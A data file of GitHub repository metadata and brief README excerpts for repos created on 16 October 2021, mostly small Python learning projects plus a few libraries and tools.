417770411;Offiline-Currency-Conveter-With-GUI;https://github.com/GreenAppleCode/Offiline-Currency-Conveter-With-GUI;Python;2021-10-16T08:48:02Z;0;0;0;
417819724;Anghami-GUI-application;https://github.com/ahmed-abd-el-fattah/Anghami-GUI-application;Python;2021-10-16T12:20:37Z;0;0;0;Anghami-GUI-application This is a anghami application with GUI . This is written by python . Each user is added to the database and will have to add his favorite songs and  they will appear only to him 
417776703;Poker;https://github.com/npbpm/Poker;Python;2021-10-16T09:15:39Z;0;0;0;
417800048;tdftest;https://github.com/TEAM-RIGENIX/tdftest;Python;2021-10-16T10:57:16Z;0;0;0;
417834898;StandardIO;https://github.com/tshakalekholoane/StandardIO;Swift;2021-10-16T13:21:56Z;0;0;0;"StandardIO  StandardIO implements the APIs found in the standard input and output libraries of Sedgewick and Wayne (2011; 2015; 2017) which aim to simplify standard input and output tasks.  Extract of the standard output specification from Sedgewick, Wayne and Dondero (2015, p. 143). Getting Started This can be used as a package with the Swift Package Manager or by linking the library with your program. Linking using swiftc Suppose you have the following program in a file named main.swift (Swift requires the main execution logic be in a file named main.swift instead of in a main function found in other languages i.e. C/C++, Go, or Java) that prints to standard output using this library. writeln(""Hello, World!"") Execute the following lines in your terminal. $ swiftc -c <path to main.swift> <path to StandardIO.swift> -module-name <name of resulting object file> $ swiftc -emit-executable main.o StandardIO.o -o <name of resulting binary> $ # (Optional) clean up. $ rm main.o StandardIO.o "
417854912;Amdibell;https://github.com/Kgamdaofficial/Amdibell;JavaScript;2021-10-16T14:37:35Z;0;0;0;"  🔱QUEEN AMDIBELL🔱       Makes it easy and fun to use WhatsApp. It is also the first Sinhala user bot for WhatsApp.      Whatsapp Group |         Youtube Channel          kg amda bot is an UserBot for WhatsApp That allowing you to get done so many tasks. The user is responsible for all possible consequences of misuse. This is not a Open-Source project. This is just a project that allow you to get deploy a bot. Additionally, it enables plug-in support for users. Install their own plugins to the original software and use as they please. Usage is entirely the responsibility of the user. The operating system is not responsible. HAVE A FUN!  Setup Very Simple Method Soon as Possible... Simple Method   KgAmda Project Team            KgAmda(Founder) 	Mr.pasiya(Co-Admin) Mr.jokah(Public Supportive) 	Mr.sithum(Web developer) AmdiBell(Graphic Designer) Mr.kavee(Group Management)             BlackHunt(Group Management) Gimhana(Group Management) Mr.hasiya(Ideas) Yasas dilipa(Mamber) Adeesha(Mamber)   ⚠️ Warning! Due to Userbot; Your WhatsApp account may be banned. This is an open source project, you are responsible for everything you do.  Absolutely, Asena executives do not accept responsibility. By establishing the Asena, you are deemed to have accepted these responsibilities.  Your account may be banned for the following reasons: - Using .ban command for more than one user. - Using fake numbers. - Spamming Too Much (If someone complains)  Visit our official website to install the Whatsapp Bot : QR Code generator and full instructions available there. License This project is protected by the GNU General Public License v3.0. Do not edit copyright messages! Disclaimer WhatsApp name, its variations and logo are registered trademarks on Facebook. We have nothing to do with the registered trademark. "
417770056;snake_game;https://github.com/skr2379/snake_game;Python;2021-10-16T08:46:22Z;0;0;0;snake_game vintage snake game. in this game snake length increases, every time eats food. the game will end up if it collide with walls or collide with tail. basic python, turtle used for this project. for loop, list slicing, tuple basic required to understand this. 
417866162;evs-cosmic-structure-formation;https://github.com/Tomenol/evs-cosmic-structure-formation;C++;2021-10-16T15:18:45Z;0;0;0;EVS of cosmic structures Based on a Fortran code developed by Pier-Stefano Corasaniti (LUTH), the goal of this Python/C code is to provide an efficient yet easy to use library to compute the mass of the most massive galaxy cluster in a given redshift bin. By using Extreme Value Statistics and assuming the validity of the LCDM cosmology, one can build a statistical model to predict the mass of the most massive galaxy cluster at a given redshift z. This code can be used to compute those predictions under the thin redshift bin hypothesis (dz <= 0.1). Sources : This library is based on the Fortran code developed by Pier-Stefano Corasaniti (LUTH) The following papers were also used for the development of this code :  Harrison & Coles, Testing Cosmology with Extreme Galaxy Clusters : https://arxiv.org/pdf/1111.1184.pdf Tinker et al., Toward a halo mass function for precision cosmology: the limits of universality : https://arxiv.org/pdf/0803.2706.pdf Chongchitnan, On the Abundance of Extreme Voids : https://arxiv.org/pdf/1502.07705.pdf Planck Collaboration, Planck 2018 results : https://arxiv.org/pdf/1807.06209.pdf  Author : Thomas MAYNADIE 
417863078;Bitcoin-Price-Prediction-using-linear-regression;https://github.com/StanleyFeleri/Bitcoin-Price-Prediction-using-linear-regression;Jupyter Notebook;2021-10-16T15:07:35Z;0;0;0;Bitcoin-Price-Prediction-using-linear-regression This Project is using Linear Regression to predict Bitcoin Price Prediction using the dataset that i collect manuallly using Bitcoin chart, i created the program using python and scikit learn library to create the model and predict the ouput, the accuracy of the model is  96.08% 
417840501;ScalableRecognitionImproved;https://github.com/DaanS8/ScalableRecognitionImproved;Python;2021-10-16T13:45:10Z;0;0;0;Scalable Recognition Improved A python implementation for a scalable object detection framework. This is an improved version of the Scalable Recognition repository that was based on the paper Scalable Recognition with a Vocabulary Tree. This improvement of this version is due to the use of a more efficient data structure using the faiss library. 
417781383;Tronco-de-Cone;https://github.com/GiovanniDaldegan/Tronco-de-Cone;Python;2021-10-16T09:35:54Z;0;0;0;"Tronco-de-Cone Só um script em Python que usei pra um trabalho de matemática, sobre tronco de cone. Usei o ManimCE v0.10.0 (uma versão mais documentada do Manim <https://www.youtube.com/c/3blue1brown>), que acredito que utiliza FFmpeg, a library Cairo, OpenGL e LaTeX (e talvez mais alguma coisa) para criar gráficos 2D e ""3D"". Acho que ficou bem bagunçado e amador, ainda preciso me acostumar mais com o ManimCE. Scritp criado em praticamente 1 semana. "
417897134;Python-Work;https://github.com/Tanishq-Jain/Python-Work;Python;2021-10-16T17:20:23Z;0;0;3;
417923784;python;https://github.com/ajaysingh111444/python;Python;2021-10-16T19:14:18Z;0;0;0;Python Codes 
417889401;Python;https://github.com/roberthcobena/Python;Python;2021-10-16T16:49:34Z;0;0;0;Python Codigos con Python 
417927895;python;https://github.com/evgvolkov/python;;2021-10-16T19:32:20Z;0;0;0;python geekbrains course 
417936832;python;https://github.com/Sankalp0109/python;Python;2021-10-16T20:10:31Z;0;0;0;
417912099;Python;https://github.com/FredericoHanai/Python;Python;2021-10-16T18:20:51Z;0;0;0;Python 
417922579;Python;https://github.com/SatSargsyan/Python;;2021-10-16T19:09:07Z;0;0;0;Python 
417900676;Python;https://github.com/Leocrsnit/Python;;2021-10-16T17:33:50Z;0;0;0;Python 
417904926;python;https://github.com/ViiniciusGM/python;;2021-10-16T17:51:12Z;0;0;0;python Curso python udemy 
417883668;Python;https://github.com/ShriGupt/Python;Jupyter Notebook;2021-10-16T16:25:44Z;0;0;0;Python 
417917607;python;https://github.com/dirtegov/python;;2021-10-16T18:45:44Z;0;0;0;
417937753;Python;https://github.com/wendiyu-pixel/Python;Python;2021-10-16T20:14:57Z;0;0;0;Python 
417889299;python;https://github.com/william1745/python;Python;2021-10-16T16:49:06Z;0;0;0;python 
417903661;Python;https://github.com/AbubakarShf/Python;;2021-10-16T17:46:08Z;0;0;0;Python x ) 
417928988;Python;https://github.com/D0zz/Python;;2021-10-16T19:37:15Z;0;0;0;Python 
417930555;Python;https://github.com/Alessandro-Vieira/Python;;2021-10-16T19:45:04Z;0;0;0;
417929781;Python;https://github.com/rajni0829/Python;Python;2021-10-16T19:41:18Z;0;0;0;"""# Python"" "
417928799;python;https://github.com/1ser1n1/python;Jupyter Notebook;2021-10-16T19:36:19Z;0;0;0;python 
417955707;Python;https://github.com/danrd/Python;Jupyter Notebook;2021-10-16T21:44:53Z;0;0;0;
417911239;python;https://github.com/esthersl/python;Python;2021-10-16T18:16:55Z;0;0;0;
417923142;Python;https://github.com/chriswilkinsoncodes/Python;;2021-10-16T19:12:00Z;0;0;0;Python Placeholder for random Pythond things. 
417917487;python;https://github.com/mohzz2794/python;Python;2021-10-16T18:45:12Z;0;0;0;
417883580;Python;https://github.com/coelhos-gabi/Python;Python;2021-10-16T16:25:24Z;0;0;0;
417932549;python;https://github.com/Sonrisa12/python;;2021-10-16T19:53:18Z;0;0;0;python 
417966033;python;https://github.com/jarobyte91/python;;2021-10-16T22:46:09Z;0;0;0;python 
417924836;python;https://github.com/anisolankure/python;;2021-10-16T19:19:01Z;0;0;0;python 
417888586;python;https://github.com/leedy5521/python;Python;2021-10-16T16:45:59Z;0;0;0;
417975815;Python;https://github.com/claudir-oliveira/Python;Jupyter Notebook;2021-10-16T23:56:09Z;0;0;0;
417883218;pythonProject;https://github.com/VtitiV/pythonProject;Python;2021-10-16T16:24:00Z;0;0;0;
417910126;PythonPOO;https://github.com/FabioKrakauer/PythonPOO;Python;2021-10-16T18:12:06Z;0;0;0;PythonPOO Trabalho para disciplina de Fundamentos de Desenvolvimento de Software 
417931302;python2;https://github.com/AgA101/python2;Python;2021-10-16T19:48:51Z;0;0;0;
417915475;pythonweekend2021;https://github.com/omarjcm/pythonweekend2021;Jupyter Notebook;2021-10-16T18:35:45Z;0;0;1;pythonweekend2021 Python Weekend 2021 
417885192;pythonProject;https://github.com/Landrevv/pythonProject;;2021-10-16T16:31:53Z;0;0;0;
417897424;python333;https://github.com/Icaro333/python333;Jupyter Notebook;2021-10-16T17:21:18Z;0;0;0;
417967109;PythonProject;https://github.com/ChroeGiroud/PythonProject;Python;2021-10-16T22:53:51Z;0;0;0;PythonProject 
417975609;pythonP;https://github.com/Jeffsmelo/pythonP;;2021-10-16T23:54:43Z;0;0;0;
417965269;pythonApp;https://github.com/marwaigb/pythonApp;;2021-10-16T22:40:40Z;0;0;0;pythonApp #insrtruction for running via Dockerfile the code in env/ folder docker build -t bitcoin . docker run -it -p:5000:5000 bitcoin run http://127.0.0.1:5000/ 
417963387;PythonfunProjects;https://github.com/UppalaPreetham/PythonfunProjects;Python;2021-10-16T22:27:31Z;0;0;0;
417974659;pythonProje;https://github.com/Jeffsmelo/pythonProje;;2021-10-16T23:47:28Z;0;0;0;
417883696;pythonProject;https://github.com/bragimov/pythonProject;;2021-10-16T16:25:50Z;0;0;0;
417896895;PythonProjects;https://github.com/dhnomura/PythonProjects;;2021-10-16T17:19:25Z;0;0;0;PythonProjects 
417943192;python3-name-generator;https://github.com/SaltedNPC/python3-name-generator;Python;2021-10-16T20:41:05Z;0;0;0;python3-name-generator 
417883666;pythonProject02;https://github.com/kit05/pythonProject02;;2021-10-16T16:25:44Z;0;0;0;
417951127;PythonMessagerLocal;https://github.com/Refaltor77/PythonMessagerLocal;Python;2021-10-16T21:20:12Z;0;0;0;PythonMessagerLocal Simple messager in python used socket installation pip install simple-chalk git clone https://github.com/Refaltor77/PythonMessagerLocal to start server python server.py to connect to server python client.py usage You can chat from server.py and reply to client messages :) images the client:   the server:   
417926676;PythonMultiprocessUpdate;https://github.com/EricRohner/PythonMultiprocessUpdate;Python;2021-10-16T19:26:50Z;0;0;0;
417890780;PythonAPI_Challenge;https://github.com/camlukos/PythonAPI_Challenge;;2021-10-16T16:55:29Z;0;0;0;PythonAPI_Challenge 
417972967;pythonProject2;https://github.com/Jeffsmelo/pythonProject2;;2021-10-16T23:34:51Z;0;0;0;
417885990;PythonPY1001;https://github.com/mentishinov/PythonPY1001;Python;2021-10-16T16:35:02Z;0;0;0;
417932290;PythonMadeEasy;https://github.com/Gobz1994/PythonMadeEasy;Jupyter Notebook;2021-10-16T19:52:29Z;1;1;0;
417912484;python3-charset_normalizer;https://github.com/pld-linux/python3-charset_normalizer;;2021-10-16T18:22:32Z;0;0;0;
417889211;PythonForBegginers;https://github.com/Educational-Websites/PythonForBegginers;CSS;2021-10-16T16:48:39Z;1;1;0;PythonForBegginers A Course of Python for Begginers!! Made by @E-Coders with Love in India. 
417961067;pythonProject2;https://github.com/kim00430/pythonProject2;Python;2021-10-16T22:13:40Z;0;0;0;
417882499;pythonProject01;https://github.com/kit05/pythonProject01;;2021-10-16T16:21:14Z;0;0;0;
417885259;pythonProject03;https://github.com/kit05/pythonProject03;;2021-10-16T16:32:08Z;0;0;0;
417915530;course-algo-python3;https://github.com/Abacadabras/course-algo-python3;;2021-10-16T18:36:03Z;0;0;0;
417908458;Proyecto_PythonNH;https://github.com/NoemiHN/Proyecto_PythonNH;;2021-10-16T18:05:09Z;0;0;0;"Proyecto_PythonNH Registros a ""Un camino para recordar"" año 2021 de la organización Plumas de Ángel en Monterrey, NL., México. "
417884513;PythonLearing5AM;https://github.com/careermentor/PythonLearing5AM;;2021-10-16T16:29:15Z;0;0;0;
417905553;Python-;https://github.com/ghost-man01/Python-;Python;2021-10-16T17:53:54Z;0;0;0;Python- The notes before this video is on NOTION. These notes are from JOHN HAMMOND's VIDEO 
417919731;-Python;https://github.com/khomyakovskaya/-Python;;2021-10-16T18:56:18Z;0;0;0;
417968396;Google_Search_in_python3;https://github.com/viracall/Google_Search_in_python3;Python;2021-10-16T23:02:10Z;0;0;0;"Google_Search_in_python3 There are several different google search library for python out there. In this repo I use some of them to create a more easy to use and generic search function and download ability.   As google enhance it's search engine there will be permanent changes needed for scraping tool such as this one. It is therefore important to inform the developer if implementation does not work. Please let me know if you encounter problems with the implementation and I will hopefully be able to help. Purpose The reason I want to be able to preform searches through a search engine is to create large datasets for machine learning. Mainly I created this repo to make the google search calls easier to use, by setting alot of the default parameters. Both textual and images. I will probably reuse some code from this repo in future development. If no interest is shown to this repo it will probably be removed from github eventually, to merge it with a larger project. How to use Copy the ""Google_Search_Functions.py"" file into your project. Try running the test.py file. This file contains the following code: import Google_Search_Functions as google  google.search(""Cute Kittens"", type = ""image"", download = True, num = 10);  This program will download 10 images of ""Cute Kittens"" from google search into a folder called ""downloads"". See default values in Google_Search_Functions, there you can see several other interesting parameters. More Code Examples Search 10 websites: response = google.search(""Cute Kittens"");  Search and download 11 Swedish news: response = google.search(""Cute Kittens"", type = ""news"", num = 11, lang=""sv"", download = True);  Safe search 10 video: response = google.search(""Cute Kittens"", type = ""video"", Safe = ""true"");  Search and download 10 images with rights and output path: response = google.search(""Cute Kittens"", type = ""image"", Safe = ""true"", path = 'path', download = True, rights =""labeled-for-nocommercial-reuse"" );  Run on docker I have now added a docker container for running the implementation without an unnecessary installation process. Try it out by installing docker and run: docker-compose up  Edit the test.py file. About This implementation lets you download or get urls to websites for google searches. Depending on parameters you might get different return values. Check them out in the Google_Search_Functions file. The reason I use and depend on other libraries are to save time. However it is possible that I will recreate this repo in the future and then instead write from scratch to make a more clean solution. The solution would include a lot of scraping from google. In the library google-images-download some html scrape is used. See link below and check out the code if you plan to instead scrape and make your own implementation. My thoughts in the matter right now is, why reinvent the wheel? This implementation is good enough. Further development In the future it might be interesting to use other search engines such as bing, DuckDuckGo, Wiki.com, Twitter, CC Search, Gibiru, StartPage. I might choose to create my entire own implementation in the future if I for some reason don't like this solution. Screenshots Download 10 images of ""Cute kittens"":  Requirements In this python program we use the following imports: import google                   # Search links import google_images_download   # Search and download images  Install them by writing: pip install -r requirements.txt  Sources and References Information and examples of how to use:   google-image-download library https://github.com/hardikvasa/google-images-download   googlesearch library https://python-googlesearch.readthedocs.io/en/latest/   Issues If you find any issues with this solution please leave an issue-ticket on the repository. Disclaimer These functions lets you download tons of data from Google. Please do not download or use any data that violates its copyright terms. Google is a search engine that merely indexes data and allows you to find them. It does NOT produce its own data and, as such, it doesn't own copyright on any of them. The original creators of the data own the copyrights. Read Google TOS before using google search functions. "
417935529;pythonfl;https://github.com/dvini0208/pythonfl;Python;2021-10-16T20:05:01Z;0;0;0;pythonfl 
417917449;pythonisms;https://github.com/kassiebradshaw/pythonisms;Python;2021-10-16T18:45:04Z;0;0;0;"Lab 42 - Pythonisms Link to my code Link to my tests  Overview Python has many elegant features that can show the difference between a ""programmer who uses Python"" and a true ""Pythonista"" Pythonista may be a silly word but it's a real thing. A true pythonista is able to leverage the particular features of Python to accomplish a task in a simpler and more easy to reason about way.  Feature Tasks & Requirements Create examples demonstrating pythonic language features. For example...   Use iterators/generators on a custom collection to...  Add ability to be used in a ""for in"" loop Add ability to be used in a list comprehension Add ability to convert to a list or other collection type    Create a decorator that adds behavior to a given function. For example...  Calculate the time spent in the function Log relevant info for debugging purposes Slow down the function Convert the return value in some way    Use dunder methods to make your code more readable and elegant. For example...  Add ability for two custom data structures to be considered equal Add ability for custom data structures to be considered truthy/falsy    Anything ele that catches your interest    Implementation Notes  Create unit tests to demonstrate the features you select  "
417887366;pythoncgi;https://github.com/MahmoudTalaat97/pythoncgi;Python;2021-10-16T16:41:01Z;0;0;0;pythoncgi 
417897831;pythondjangotest;https://github.com/keloxers/pythondjangotest;Python;2021-10-16T17:22:54Z;0;0;0;pythondjangotest 
417957023;pythonisms;https://github.com/kevinhenry/pythonisms;Python;2021-10-16T21:51:26Z;0;0;0;
417935763;pythonstuff;https://github.com/crispycrumbs/pythonstuff;;2021-10-16T20:06:04Z;0;0;0;
417939694;pythonisms;https://github.com/danieldills/pythonisms;;2021-10-16T20:23:56Z;0;0;0;
417900695;pythoncgi;https://github.com/andrewroshdy/pythoncgi;;2021-10-16T17:33:53Z;0;0;0;pythoncgi repoo for python cgi 
417942179;pythonism;https://github.com/Marleyman876/pythonism;Python;2021-10-16T20:35:38Z;0;0;0;
417878686;pythonparth;https://github.com/pythonparth/pythonparth;;2021-10-16T16:06:42Z;0;0;0; 👋 Hi, I’m @pythonparth 👀 I aspire to develope algorithms backed by psychology of human brain to manipulate our community. 🌱 I’m currently on the first step of basic programming. 💞️ I’m looking to collaborate on ... 📫 email me @ parthmaheshwari1111@gmail.com  
417955013;pythonnft;https://github.com/chattertechno/pythonnft;Solidity;2021-10-16T21:41:03Z;0;0;0;
417954692;pythonsort;https://github.com/richardwalenga/pythonsort;Python;2021-10-16T21:39:21Z;0;0;0;Python Sort This code was a way for me to practice writing Python code by implementing common sorting algorithms using what I created with Typescript as a guide. I have logging in test.py which times the implementations against the same large array of random ints. This is written against Python 3.9.7. 
417939998;pythonisms;https://github.com/Mmarcos01/pythonisms;Python;2021-10-16T20:25:20Z;0;0;0;Pythonisms  Create examples demonstrating pythonic language features. Create unit tests to demonstrate the features you select.  Collaborators  Daniel Dills Garfield Grant  
417883432;pythontkinter;https://github.com/inaki156/pythontkinter;;2021-10-16T16:24:49Z;0;0;0;
417960868;toy-projects;https://github.com/nws0078/toy-projects;Python;2021-10-16T22:12:14Z;1;1;0;toy-projects Keylogger  it needs to be running until the computer goes off  For now, you need to press ESC to end the program. This makes the whole program a bit pointless and useless. 
417950120;Calculator-py;https://github.com/Athenaazar/Calculator-py;Python;2021-10-16T21:15:05Z;0;0;0;Calculator-py Python 
417895779;python_pro;https://github.com/evaristofm/python_pro;;2021-10-16T17:15:00Z;0;0;0;python_pro Projeto django 
417893635;python-server;https://github.com/blakesmac/python-server;Python;2021-10-16T17:06:21Z;0;0;0;
417935827;python_training;https://github.com/vorzaxe/python_training;;2021-10-16T20:06:21Z;0;0;0;Repository for Python Training 
417953465;Python_course;https://github.com/Book-Shelf/Python_course;;2021-10-16T21:32:43Z;0;0;0;Python_course 
417933576;Proyecto-python;https://github.com/SDWarkXD/Proyecto-python;Python;2021-10-16T19:57:12Z;0;0;0;Dig Dug based game for Kansas BEST Robotics Competition. 
417921021;faculdade-python;https://github.com/leandrompadilha/faculdade-python;Python;2021-10-16T19:02:02Z;0;0;0;Projeto acadêmico - Python Sistema para realizar cálculos acerca do valor de imposto de renda:  pergunta ao usuário o valor de contribuintes que será realizado o cálculo calcula imposto de renda com base em tabela anexa ao código insere as informações de cada contribuinte cadastrado em um dicionário e atribui os dicionários a uma lista apresenta os dados de cada contribuinte (nome, cpf, salário, imposto cobrado e salário líquido) calcula a soma e a média dos impostos pagos pelos funcionários cadastrados  Para criação deste sistema foram utilizados conceitos como:  Manipulação de variáveis Estruturas condicionais: if, elif e else Estruturas de repetição: for e while Criação e manipulação de listas e dicionários Criação e importação de módulos e pacotes Criação de funções, definições de atributos e docstrings Tratamento de erros e exceções  
417903150;Udemy_python;https://github.com/AdamPrusz/Udemy_python;;2021-10-16T17:44:16Z;0;0;0;test git 
417931448;Python-Nmap;https://github.com/MikeyPPPPPPPP/Python-Nmap;Python;2021-10-16T19:49:36Z;0;0;0;Python-Nmap (MAC) This is a python module that uses Nmap to do a ping scan. You have to install Nmap to use https://nmap.org/download.html 
417943030;python-datascience;https://github.com/vincentprudhomme/python-datascience;Jupyter Notebook;2021-10-16T20:40:02Z;1;1;0;python-datascience This repo contains Python sripts and Jupyther Notebook for Data Science and Data analysis 
417905854;wsb-python;https://github.com/JFrred/wsb-python;Python;2021-10-16T17:55:04Z;0;0;0;
417909589;python-app;https://github.com/MarcoLopes389/python-app;Python;2021-10-16T18:09:39Z;0;0;0;
417970930;learning_python;https://github.com/marcosmso/learning_python;Jupyter Notebook;2021-10-16T23:19:17Z;0;0;0;
417948387;oop_python;https://github.com/rough-khata/oop_python;Python;2021-10-16T21:06:30Z;0;0;0;
417955769;ygoclient-python;https://github.com/hinihatetsu/ygoclient-python;Python;2021-10-16T21:45:15Z;0;0;0;YGO Client for Python This client can connect YGO application like Project Ignis:EDOPro. You can develop your own AI agent for ADS easily. Unfortunately, this package is still under development. The developers need your help. Please contact by:  Twitter: @hinihatetsu Discord: hinihatetsu#4302 E-mail: hinihatetsu@gmail.com  Installation pip install git+https://github.com/hinihatetsu/ygoclient-python  Example 
417900341;python-pure;https://github.com/Izimablue/python-pure;Python;2021-10-16T17:32:18Z;0;0;0;
417941115;EjerciciosPython;https://github.com/WallMonfortt/EjerciciosPython;Python;2021-10-16T20:30:45Z;0;0;0;
417889643;python_linq;https://github.com/tho-masu/python_linq;Python;2021-10-16T16:50:43Z;0;0;0;
417964555;python-exercise;https://github.com/jade0304/python-exercise;Python;2021-10-16T22:35:48Z;0;0;0;
417956243;math-python;https://github.com/rtxdr/math-python;Python;2021-10-16T21:47:25Z;0;0;0;Math formulas solver disclaimer my code is so bad with this math python script you can feel real pain because my code is super unoptimised about this code i have to take python classes... also i want to start coding on java but i can't even make proper python code so i guess i'm going to make the ultimate spaghetti code of 2021 supported formulas :  pythagor teorem idk how to write that  support me a simple comment saying how cool my code is will make me very productive 
417924478;python-projects;https://github.com/j0sip-mi0c/python-projects;Python;2021-10-16T19:17:22Z;0;0;0;
417917051;ToraPython;https://github.com/parrymay/ToraPython;Python;2021-10-16T18:43:15Z;0;0;0;
417918908;python-playground;https://github.com/Leonovap/python-playground;Python;2021-10-16T18:51:52Z;0;0;0;
417931474;python_tutorial;https://github.com/LucaLogallo/python_tutorial;Python;2021-10-16T19:49:43Z;0;0;0;
417929640;python_20211018;https://github.com/piotrgradzinski/python_20211018;;2021-10-16T19:40:32Z;0;0;0;Szkolenie Python 18.10.2021 
417908472;python.io;https://github.com/ChienYa-Hung/python.io;;2021-10-16T18:05:12Z;0;0;0;
417936502;python-challenge;https://github.com/KevinKVNPR/python-challenge;;2021-10-16T20:09:09Z;0;0;0;python-challenge 
417924473;python-projects;https://github.com/nand0ps/python-projects;Python;2021-10-16T19:17:21Z;0;0;0;python-projects Series of python pentest scripts. The scripts are solutions to cool challenges from the @JMFD Magical Python Learning Group. scope.py Used to verify the scope of an engagement python3 scope.py 131.253.12.5 131.91.4.55 192.224.113.15 199.60.28.111 20.128.0.0/16  or  python3 scope.py -i /tmp/input.txt   
417917843;sorteo_python;https://github.com/Joaquin-Parrilla/sorteo_python;Python;2021-10-16T18:46:46Z;0;0;0;
417937820;Python_Exercises;https://github.com/norvikalexyan/Python_Exercises;Python;2021-10-16T20:15:18Z;0;0;0;
417936472;python-challenge;https://github.com/farimahs/python-challenge;;2021-10-16T20:09:03Z;0;0;0;python-challenge The python challenges found here are the example of data analyses work 
417936463;Python_Challenge;https://github.com/LineaFuller/Python_Challenge;;2021-10-16T20:09:02Z;0;0;0;Python_Challenge The python challenges found here are examples of data analysis work 
417963272;python_basics;https://github.com/JacemElouaer/python_basics;Jupyter Notebook;2021-10-16T22:26:39Z;0;0;0;
417965600;Python-party;https://github.com/Tatianarjo/Python-party;Python;2021-10-16T22:43:17Z;0;0;0;
417936469;python-challenge;https://github.com/jwwstauf/python-challenge;;2021-10-16T20:09:02Z;0;0;0;python-challenge The python challenges found here are examples of data analysis work. 
417941165;Python_Selenium;https://github.com/SaurabhAgarwal1243/Python_Selenium;;2021-10-16T20:30:58Z;0;0;0;
417919577;Python_alapok;https://github.com/matuszkak/Python_alapok;Python;2021-10-16T18:55:32Z;0;0;0;
417926896;starter-python;https://github.com/Rorins/starter-python;;2021-10-16T19:27:46Z;0;0;0;
417910815;python-ml;https://github.com/gabbythomas/python-ml;;2021-10-16T18:15:09Z;0;0;0;python-ml Prerequisites  Python 3  
417892862;python_games;https://github.com/GFMatte/python_games;Python;2021-10-16T17:03:28Z;0;0;0;
417885828;python-31;https://github.com/ArmaansPiano/python-31;Python;2021-10-16T16:34:25Z;0;0;0;python-31 
417951642;Python_fuggvenyek;https://github.com/matuszkak/Python_fuggvenyek;Python;2021-10-16T21:22:39Z;0;0;0;
417900056;Python-Algorithm;https://github.com/JB02022/Python-Algorithm;Jupyter Notebook;2021-10-16T17:31:17Z;0;0;0;
417906192;python_obfuscator;https://github.com/obsidian-h4x3r/python_obfuscator;Python;2021-10-16T17:56:32Z;0;0;0;python_obfuscator A simple python obfuscation tool WARNING This program is full of bugs. When obfusctation is complete go through the code (mainly the strings) because they can get messed up 
417879706;Python-2;https://github.com/htamagnus/Python-2;Python;2021-10-16T16:10:12Z;0;0;0;Python 2 Parte 2 de exercícios e programas 
417905837;cursoemvideo-python;https://github.com/gabicantarini/cursoemvideo-python;Python;2021-10-16T17:54:59Z;0;0;0;cursoemvideo-python Exercícios de Python Mundo 1 e 2 
417934203;dev-python;https://github.com/njaneto/dev-python;HTML;2021-10-16T19:59:47Z;0;0;0;dev-python lista de exercícios feitos em python 
417887984;demo-pythonista;https://github.com/kevinhenry/demo-pythonista;Python;2021-10-16T16:43:39Z;0;0;0;
417935804;ds-python;https://github.com/kirenz/ds-python;TeX;2021-10-16T20:06:14Z;0;0;0;ds-python 
417936618;python-challenge;https://github.com/JordanJaner/python-challenge;;2021-10-16T20:09:37Z;0;0;0;python-challenge The python challenges found here are example of data analysis work 
417959616;back-python;https://github.com/kurodevs/back-python;;2021-10-16T22:05:30Z;0;0;0;
417947975;Deversitech.python;https://github.com/jfurtadoti/Deversitech.python;;2021-10-16T21:04:16Z;0;0;0;Deversitech.python Bootcamp de Linguagem Python 
417957498;Programas-Python;https://github.com/Daniel-derf/Programas-Python;Python;2021-10-16T21:54:32Z;0;0;0;
417922866;python.py;https://github.com/ShubhamRai05/python.py;;2021-10-16T19:10:33Z;0;0;0;
417963144;Exercises_Python;https://github.com/Inoxybel/Exercises_Python;Jupyter Notebook;2021-10-16T22:25:38Z;0;0;0;Exercises_Python This directory contain Source Files with my solutions of public exercises in Python Each directory have a link to webpage with exercises. Open that link and check the exercises descriptions to compair with source code on directory. Eventually that directory will be update with news Source Files of anothers exercises. You can use this sources files for your study. 
417907470;python_data;https://github.com/Brijesh1990/python_data;Python;2021-10-16T18:01:19Z;0;0;0;python_data python data 
417904403;Python-Vectorization;https://github.com/SudaisAlam/Python-Vectorization;Jupyter Notebook;2021-10-16T17:48:54Z;0;0;0;
417936692;python-challenge;https://github.com/bakeralexan/python-challenge;;2021-10-16T20:09:51Z;0;0;0;python-challenge Python challenges found here are examples of data analysis work. 
417945074;Algorithm-Python;https://github.com/ByounghyunOh/Algorithm-Python;;2021-10-16T20:49:36Z;0;0;0;
417964479;python-sdk;https://github.com/auth3-dev/python-sdk;Python;2021-10-16T22:35:18Z;0;0;0;Auth3 Python SDK The official Auth3 python SDK library. API Documentation Check-out the API documentation at https://docs.auth3.dev/apis/identity-platform/administrative for further help. Installation Add to your requirements.txt: auth3-sdk>=1.0.0  Or run: python3 -m pip install --upgrade auth3-sdk  Build Run python setup.py build # from within the root folder (this) Install from sources $ pip install -rrequirements.txt $ GRPC_PYTHON_BUILD_WITH_CYTHON=1 python setup.py install # from within the root folder (this) Or, with pip: # For the next two commands do `sudo pip install` if you get permission-denied errors $ pip install -rrequirements.txt $ GRPC_PYTHON_BUILD_WITH_CYTHON=1 pip install . Additional help You can find further help, examples, tools and suggestions here. Change Language Not your target language? Check out our official SDKs for:  go cpp java nodejs dart python php ruby rust scala swift c#  Contributing At this time we don't accept external contributions, but we're open for feedbacks and requests. We're always looking for contributions on our security, refer to our dedicated page for more. Support Customers of the Auth3 Identity Platform can access support through the official channels available on our website. We won't be able to accomodate Customer requests through the bug tracker for security reasons. License Read the LICENSE. 
417958061;te-python;https://github.com/totalemail/te-python;Python;2021-10-16T21:57:36Z;0;0;0;TotalEmail Python SDK ~ te_python  Python SDK for TotalEmail. Usage Coming soon... Credits This package was created with Cookiecutter and Floyd Hightower's Python project template. 
417944152;Ex_python;https://github.com/Sbdoe-Dev/Ex_python;;2021-10-16T20:45:26Z;0;0;0;
417911680;python-libraries;https://github.com/patelsaumya/python-libraries;Jupyter Notebook;2021-10-16T18:18:52Z;0;0;0;python-libraries 
417913099;alienPythons;https://github.com/jgetsoian/alienPythons;;2021-10-16T18:25:26Z;0;0;0;
417916421;Pythonic_Monopoly;https://github.com/skohnle14/Pythonic_Monopoly;;2021-10-16T18:40:16Z;0;0;0;Pythonic_Monopoly 
417951597;Python-Projects;https://github.com/THEpressao/Python-Projects;;2021-10-16T21:22:25Z;0;0;0;
417936526;python-challenge;https://github.com/Razzei/python-challenge;;2021-10-16T20:09:14Z;0;0;0;python-challenge The python challenges found here are examples of data analysis work 
417919229;Python_workbook;https://github.com/MoshmiPabari/Python_workbook;;2021-10-16T18:53:36Z;0;0;0;Python_workbook 
417895070;pilares_python;https://github.com/albertodmcruz/pilares_python;Jupyter Notebook;2021-10-16T17:12:06Z;0;0;0;
